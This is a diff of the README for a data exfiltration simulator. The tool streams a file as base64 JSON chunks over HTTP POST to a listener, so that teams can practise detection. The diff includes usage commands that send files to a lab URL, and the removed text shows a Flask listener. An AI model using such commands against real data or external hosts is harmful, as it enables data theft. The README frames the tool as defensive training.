@@ -3,115 +3,52 @@
 > or hold explicit written authorization to assess**. Unauthorized use is
 > prohibited and may be illegal. Read [ETHICS.md](ETHICS.md) and
 > [SCOPE.md](SCOPE.md) before use. Use at your own risk; **AS IS**, no warranty.
-# Data Exfiltration Simulator
 
-⚠️ **LAB USE ONLY** - This tool is designed for isolated lab environments and educational purposes. Only use with dummy data and listeners you control.
+# Exfil Simulator
 
-## Overview
+![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
+![GitHub Stars](https://img.shields.io/github/stars/5h4d0wn1k/exfil-simulator)
+![Last Commit](https://img.shields.io/github/last-commit/5h4d0wn1k/exfil-simulator)
+![GitHub Issues](https://img.shields.io/github/issues/5h4d0wn1k/exfil-simulator)
 
-A data exfiltration simulation tool that demonstrates how data exfiltration attacks work in a controlled lab environment. Uses chunked HTTP POST requests to simulate exfiltration techniques.
+> **Data exfiltration simulator for lab environments** — a chunked HTTP POST
+> exfiltration engine that teaches detection and network forensics in isolated
+> labs. Educational red-team and blue-team tooling; never for real data.
+
+## Why
+
+Data exfiltration is one of the most common post-breach behaviors, yet detection
+teams rarely get safe ways to rehearse against it. This simulator encodes dummy
+data into base64 JSON and streams it in configurable chunks to a **listener you
+control**, giving blue teams a reproducible exfiltration pattern to tune DLP,
+egress monitoring, and anomaly detection against — without ever touching real
+data, production systems, or third-party infrastructure. The project is
+strictly lab-only: point it at your own listener, use dummy files, and keep the
+default chunk/delay knobs to mimic slow, low-and-slow data theft.
 
 ## Features
 
-- **Chunked Exfiltration**: Simulates chunked data exfiltration
-- **HTTP POST**: Uses HTTP POST requests for data transfer
-- **Base64 Encoding**: Encodes data in base64 format
-- **Configurable**: Adjustable chunk size and delay
-- **Lab-Safe**: Designed for isolated lab environments only
+- **Chunked HTTP POST exfiltration** — streams any file to a lab listener in
+  configurable-sized chunks (`--chunk-size`, default 512 bytes).
+- **Base64 + JSON encoding** — each chunk is sent as `{"i": <index>,
+  "data": <base64>}` with a JSON content type.
+- **Inter-chunk delay** — realistic slow exfiltration pacing (`--delay`,
+  default 0.2 s).
+- **Stdlib-only core** — built on `urllib`; no build step, works on Python 3.8+.
+- **Lab-safe printing** — loud lab-only warning banner on every run.
 
-## Installation
-
-### Requirements
-
-- Python 3.8+
-- Standard library only (no external dependencies!)
-
-### Setup
+## Quickstart
 
 ```bash
-# Clone the repository
-git clone https://github.com/5h4d0wn1k/exfil-simulator.git
-cd exfil-simulator
-
-# No installation needed!
+# No external dependencies required (Python 3.8+)
 python exfil_simulator.py --help
-```
 
-## Usage
-
-### Basic Usage
-
-```bash
-# Simulate exfiltration to lab listener
-python exfil_simulator.py \
-  --url http://your-lab-listener.com/receive \
-  --file dummy_data.txt
-```
-
-### Advanced Usage
-
-```bash
-# Custom chunk size and delay
-python exfil_simulator.py \
-  --url http://your-lab-listener.com/receive \
-  --file dummy_data.txt \
-  --chunk-size 1024 \
-  --delay 0.5
-```
-
-## Command-Line Options
-
-| Option | Description | Default |
-|--------|-------------|---------|
-| `--url` | Lab listener URL (required) | - |
-| `--file` | Dummy data file to exfiltrate (required) | - |
-| `--chunk-size` | Chunk size in bytes | 512 |
-| `--delay` | Delay between chunks (seconds) | 0.2 |
-
-## Listener Setup
-
-You need to set up a listener to receive the exfiltrated data. Example using Python Flask:
-
-```python
-from flask import Flask, request
-import base64
-import json
-
-app = Flask(__name__)
-
-@app.route('/receive', methods=['POST'])
-def receive():
-    data = request.json
-    chunk_data = base64.b64decode(data['data'])
-    print(f"Received chunk {data['i']}: {chunk_data[:50]}...")
-    return "OK"
-
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=8000)
-```
-
-## Output Format
-
-```
-⚠️  Lab-only. Point to a listener you control. Use dummy data only.
-[+] Exfil simulation complete.
-```
-
-## Examples
-
-### Example 1: Basic Simulation
-
-```bash
-# Simulate exfiltration
+# Simulate exfiltration to a lab listener you control
 python exfil_simulator.py \
   --url http://localhost:8000/receive \
-  --file test_data.txt
-```
+  --file dummy_data.txt
 
-### Example 2: Custom Configuration
-
-```bash
-# Larger chunks with longer delay
+# Larger chunks with a longer delay
 python exfil_simulator.py \
   --url http://localhost:8000/receive \
   --file large_file.bin \
@@ -119,57 +56,34 @@ python exfil_simulator.py \
   --delay 1.0
 ```
 
-## Use Cases
+`--url` is the only required flag together with `--file`. Receivers decode the
+base64 `data` field from each JSON chunk; the classic lab listener (from the
+older README) is a small Flask route at `/receive` that base64-decodes and
+prints each chunk index.
 
-- **Security Training**: Learn about data exfiltration techniques
-- **Lab Testing**: Test detection mechanisms in lab environments
-- **Educational Purposes**: Understand exfiltration attack patterns
+## Project structure
+
+```
+exfil_simulator.py   # CLI + exfiltration engine (stdio)
+requirements.txt     # optional deps note; core runs on the stdlib alone
+ETHICS.md            # ethics/authorized-use policy (read first)
+SCOPE.md             # defined assessment scope
+```
+
+## Documentation
+
+- [ETHICS.md](ETHICS.md) — ethical-use policy, read first
+- [SCOPE.md](SCOPE.md) — authorized-scope definition
+- [CONTRIBUTING.md](CONTRIBUTING.md) — how to contribute
+- [SECURITY.md](SECURITY.md) — vulnerability reporting
+- [CHANGELOG.md](CHANGELOG.md) — version history
 
 ## Contributing
 
-Contributions are welcome! Please:
+Contributions for lab tooling, better dummy-data generation, and detection
+exercises are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md); all changes must
+preserve the lab-only guarantees.
 
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Submit a pull request
-
----
-
-## ⚠️ Legal Disclaimer
-
-### Educational Purpose Only
-This tool is provided strictly for **educational purposes** and **authorized security testing** only. It is intended to help security professionals and students learn about security concepts in controlled environments.
-
-### Authorized Use Only
-- You must have **explicit written authorization** before testing any system you do not own
-- Unauthorized access to computer systems is **illegal** and punishable under laws including but not limited to the Computer Fraud and Abuse Act (CFAA), Computer Misuse Act, and similar legislation worldwide
-- Only use this tool on systems you own, have permission to test, or in isolated lab environments
-
-### No Warranty
-This software is provided "AS IS" without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. The author makes no representations or warranties regarding the accuracy, completeness, or reliability of this software.
-
-### Limitation of Liability
-**In no event shall the author (Nikhil Nagpure) be liable for any direct, indirect, incidental, special, exemplary, or consequential damages (including, but not limited to, procurement of substitute goods or services; loss of use, data, or profits; or business interruption) however caused and on any theory of liability, whether in contract, strict liability, or tort (including negligence or otherwise) arising in any way out of the use of this software, even if advised of the possibility of such damage.**
-
-### User Responsibility
-- The user assumes **full responsibility** for any consequences resulting from the use of this tool
-- The author is **not responsible** for any misuse, damage, or illegal activities performed with this software
-- Users are solely responsible for ensuring compliance with all applicable local, state, national, and international laws and regulations
-
-### Indemnification
-By using this software, you agree to **indemnify, defend, and hold harmless** the author from and against any and all claims, liabilities, damages, losses, costs, and expenses (including reasonable attorneys fees) arising from or related to your use of this software.
-
-### Responsible Disclosure
-If you discover vulnerabilities using this tool, please follow responsible disclosure practices and report them to the affected parties through appropriate channels.
-
----
-
-**By using this software, you acknowledge that you have read, understood, and agree to be bound by this disclaimer.**
 ## License
 
-This project is for educational purposes only. Use responsibly and ethically.
-
----
-
-**Remember**: Lab use only! Never use on production systems!
+MIT — see [LICENSE](LICENSE).
